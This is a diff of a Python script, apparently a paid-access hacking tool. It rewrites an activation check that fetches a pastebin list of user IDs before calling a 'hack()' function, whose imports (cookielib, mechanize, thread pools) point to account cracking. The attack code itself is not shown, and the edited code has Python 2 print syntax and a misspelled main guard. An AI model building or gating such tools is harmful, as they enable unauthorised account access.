@@ -9,6 +9,7 @@ import os
 import colorama
 import uuid
 import time
+import requests
 def hack():
     import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
     from multiprocessing.pool import ThreadPool
@@ -615,23 +616,21 @@ import uuid
 def baha():
     uuid = str(os.geteuid()) + str(os.getlogin())
     id = "-".join(uuid)
-    print("\x1b[37;1mYour ID : "+id)
-    try:
-        httpCaht = requests.get("https://pastebin.com/2WuEPjdc").text
-        if id in httpCaht:
-            print("\x1b[37;1mYOUR ID IS ACTIVE.........")
-            msg = str(os.geteuid())
-            time.sleep(1)
-            hack()
-        else:
-            print("\x1b[37;1mYOUR ID IS NOT ACTIVE.........")
-            time.sleep(1)
-            sys.exit()
-    except:
+    print "\x1b[37;1mYour ID : " + id
+    httpCaht = requests.get("https://pastebin.com/2WuEPjdc").text
+    if id in httpCaht:
+        print "\x1b[37;1mYOUR ID IS ACTIVE........."
+        msg = str(os.geteuid())
+        time.sleep(1)
+        hack()
+    else:
+        print "\x1b[37;1mYOUR ID IS NOT ACTIVE........."
+        time.sleep(1)
         sys.exit()
 
     if name == '__main__':
         baha()
+
 
         
         
